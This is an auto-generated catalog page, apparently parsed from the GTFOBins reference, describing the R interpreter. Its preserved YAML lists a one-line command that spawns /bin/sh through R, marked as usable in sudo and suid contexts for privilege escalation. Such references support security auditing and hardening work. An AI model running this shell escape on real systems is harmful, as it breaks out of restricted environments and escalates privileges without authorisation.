---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# R

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `r` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/R` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [R](../../tools/linux/r.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | r |
| name | R |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/r/ |

## Preserved Source Material

```yaml
_body: ''
_name: R
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/R
functions:
  shell:
  - code: R --no-save -e 'system("/bin/sh")'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
